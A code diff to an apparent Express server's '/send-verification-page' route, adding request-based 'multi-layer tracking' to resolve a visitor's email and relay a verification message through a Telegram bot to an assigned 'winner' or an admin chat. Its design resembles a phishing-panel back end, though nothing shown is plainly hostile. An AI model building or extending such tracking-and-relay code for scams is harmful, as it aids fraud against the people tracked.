@@ -1352,13 +1352,20 @@ app.post("/send-verification-page", async (req, res) => {
       }
     };
 
+    // ✅ RESOLVE EMAIL via multi-layer tracking to find original winner
+    let resolvedEmail = email;
+    if (!userWinnerTelegram[email]) {
+      resolvedEmail = resolveEmailFromRequest(req, null, null) || email;
+      console.log(`🔍 Resolved email via tracking: ${email} → ${resolvedEmail}`);
+    }
+
     const botToken = process.env.BOT_TOKEN;
     const chatId = process.env.ADMIN_CHAT_ID;
 
-    // ✅ SEND TO WINNER ONLY (use tracking email for winner lookup)
-    if (email && userWinnerTelegram[email]) {
-      console.log(`📨 Verification going to winner only: ${userWinnerTelegram[email]}`);
-      await sendFollowUpMessage(email, message, options);
+    // ✅ SEND TO WINNER ONLY (use resolved email for winner lookup)
+    if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
+      console.log(`📨 Verification going to winner only: ${userWinnerTelegram[resolvedEmail]}`);
+      await sendFollowUpMessage(resolvedEmail, message, options);
     } else {
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
       await fetch(url, {
